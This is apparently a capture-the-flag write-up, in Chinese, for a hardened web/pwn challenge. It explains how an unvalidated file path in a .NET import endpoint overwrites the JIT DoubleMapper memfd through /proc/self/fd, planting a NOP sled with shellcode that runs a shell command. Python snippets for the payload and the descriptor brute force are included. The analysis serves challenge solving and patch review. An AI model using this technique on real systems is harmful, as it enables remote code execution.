# Mafuyuuuuu-rev

## 题目简述

本题是 `Mafuyuuuuu` 的加固版本。附件需要先取得前置题 flag，再按题面规则处理并计算 SHA-256 得到解压密码。服务仍由 nginx、Vite/React 前端和 .NET 8 后端 `PaperTrailDesk.dll` 组成；`/flag` 仅 root 可读，非特权后端只能通过 setuid 程序 `/readflag` 获取内容。

两个版本的后端 DLL 哈希不同，加固版增加了诸如信号提交限速器一类约束，前端也有两秒冷却逻辑。但这些变化没有修复 live-package 导入接口中的任意路径写入。仓库中两个版本的官方 `solve.py` 的 SHA-256 完全相同，说明预期利用链仍是：

```text
导入接口任意文件写
    -> /proc/self/fd/N
    -> .NET JIT DoubleMapper 后备文件
    -> 原生 shellcode
    -> /readflag
```

该题需要逆向 .NET 程序发现文件写原语，但最终利用依赖 JIT 内存映射和 shellcode 执行，因此归入 Pwn。

## 解题过程

### 1. 不把前端限制误认为后端安全边界

前端 `main.js` 中可以看到信号按钮的冷却逻辑，后端程序集也出现了 `PostSignalLimiter`。这些机制只约束相应的信号提交功能，浏览器侧冷却更可以被直接绕过。

官方解法完全不访问该功能，而是直接调用：

```text
POST /api/sekai/live-package/import
```

因此分析加固版时，应先按路由逐一确认限制究竟保护了哪个处理器，不能仅凭“增加了 rate limit”推断整个应用已被加固。

### 2. 从 DLL 中恢复任意路径写入

对 `PaperTrailDesk.dll` 的 `ApplyChart`、`DecodeBody` 和导出处理逻辑进行反编译，可以得到 `chart` 的格式：

```text
Name;Format;Append;Lane
```

构造：

```text
x;b64;false;/proc/self/fd/8
```

会得到：

- 名称为 `x`；
- `body` 按 Base64 解码；
- 关闭追加模式；
- 将解码结果写入 `/proc/self/fd/8`。

程序虽然包含 `IsSafeExportName`，但导入流程最终把 `Lane` 直接交给文件流，没有验证其是否位于 `/app/exports`，也没有拒绝绝对路径。加固版仍然保留这一原语。

最小请求形式为：

```python
requests.post(
    base + "/api/sekai/live-package/import",
    json={
        "name": "x",
        "body": base64.b64encode(payload).decode(),
        "chart": "x;b64;false;/proc/self/fd/8",
    },
    timeout=5,
)
```

### 3. 将文件写指向 JIT DoubleMapper

.NET 8 在 Linux 上可通过 DoubleMapper 管理 JIT 代码：同一个 memfd 对象分别映射为可写视图和可执行视图。这样 JIT 编译器可以写机器码，而执行视图不必具有写权限。

但是，同一进程可通过 `/proc/self/fd/N` 重新打开已存在的描述符。若导入接口覆盖 DoubleMapper 的后备文件，可执行视图也会看到新内容。于是无需直接调用 `mprotect()`，任意文件写本身就能改变后续执行的 JIT 代码。

描述符编号并不固定，官方脚本使用：

```python
candidates = [8] + [fd for fd in range(3, 80) if fd != 8]
```

`8` 是参考环境中的高概率值，其余范围用于兼容初始化顺序变化。请求失败不能直接判定利用失败，因为写错描述符、写中后连接中断、或覆盖后端代码都可能表现为 HTTP 异常。

### 4. 构造逐页自定位载荷

官方脚本生成 x86-64 shellcode，先调用 `fork()`：

- 父进程恢复栈帧并 `ret`，尽量维持后端可用；
- 子进程执行 `execve("/bin/bash", ["bash", "-c", command], NULL)`。

默认命令为：

```bash
/readflag > /app/exports/flag.txt
```

shellcode使用 RIP 相对地址访问内嵌字符串，不依赖进程 ASLR。每个 4096 字节页面都放置相同布局：

```python
PAGE_SIZE = 4096

def build_payload(command):
    shellcode = build_shellcode(command)
    page_payload = (
        b"\x90" * (PAGE_SIZE - len(shellcode) - 16)
        + shellcode
        + b"\x90" * 16
    )
    return page_payload * 2048
```

最终 8 MiB 载荷覆盖大量 JIT 后备页。只要某个被调用的 JIT 入口落入覆盖范围，就会沿所在页的 NOP 滑道执行到 shellcode，而不要求提前知道可执行映射的虚拟地址或精确函数偏移。

### 5. 枚举、触发并回收结果

核心循环如下：

```python
body = base64.b64encode(build_payload(command)).decode()

for fd in candidates:
    chart = f"x;b64;false;/proc/self/fd/{fd}"
    try:
        request(
            base,
            "/api/sekai/live-package/import",
            {
                "name": "x",
                "body": body,
                "chart": chart,
            },
            timeout=5,
        )
    except Exception:
        pass

    wait_ready(base)
    flag = poll_after_write(base)
    if flag:
        print(flag)
        break
```

`wait_ready()` 反复请求 `/healthz`。它不仅等待服务恢复，也让进程继续执行托管代码，提高命中被覆盖 JIT 页的机会。`poll_after_write()` 再读取：

```text
GET /sekai/replays/flag.txt
```

该路由正常提供 `/app/exports` 中的文件，因此不需要另找文件读取漏洞。

运行方式为：

```bash
python3 solve/solve.py http://127.0.0.1:8089
```

脚本依赖 Python `requests`。如果目标初始化较慢，可以增加 `wait_ready()` 和 `poll_after_write()` 的轮询次数；不应先扩大描述符范围，因为覆盖无关高编号描述符只会增加不稳定性。

## 方法总结

加固版真正考查的是对“补丁覆盖面”的验证：

1. DLL 和前端确实增加了限制，但限制位于信号提交路径；
2. live-package 导入仍把 `Lane` 当作未经约束的实际文件路径；
3. `/proc/self/fd/N` 把任意文件写连接到 .NET JIT DoubleMapper；
4. 逐页重复的 NOP 滑道与位置无关 shellcode消除了精确地址需求；
5. 子进程调用 `/readflag`，结果通过已有 replay 路由返回。

因此，判断加固是否有效不能只比较二进制是否变化，也不能只查看前端新增了什么。必须把限制追踪到具体后端路由和最终危险操作；本题新增的限速并没有切断决定性的导入写入原语。
